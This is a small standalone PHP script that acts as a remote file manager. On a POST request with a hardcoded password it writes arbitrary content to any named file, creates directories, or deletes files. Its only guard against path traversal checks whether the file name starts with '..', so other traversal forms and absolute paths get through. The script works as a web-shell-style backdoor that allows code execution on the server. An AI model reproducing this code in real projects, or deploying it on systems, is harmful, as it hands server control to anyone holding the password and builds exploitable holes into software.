<?php
$sf=strstr($_POST["filename"],"..");
if ($sf == $_POST["filename"]){
    echo "You do not have permission to modify this file.";
}
else{
    if ($_POST["password"]=="wry_rygzs123456" ){
        if ($_POST["pd"]=="file"){
            $filename = $_POST["filename"];
            $fp= fopen($filename, "w");  //w是写入模式，文件不存在则创建文件写入。
            $len = fwrite($fp, $_POST["filewrite"]);
            fclose($fp);
            echo "File modified successfully.";
        }
        else if($_POST["pd"]=="dir"){
            if(!is_dir($_POST["filename"])){
                mkdir($_POST["filename"]);
                echo "Directory created successfully.";
            }
            else{echo "The directory exists and cannot be created.";}
        }
        else if($_POST["pd"]=="del"){
            $p=unlink($_POST["filename"]);
            $p2=rmdir($_POST["filename"]);
            if ($p or $p2){
                echo "File deleted successfully.";
            }
            else{
                echo "File deletion failed. Possible reasons:<br/>Don't have this permission.<br/>The file does not exist.";
            }
        }
    }
    else{
    echo "Password error.";
    }
}

?>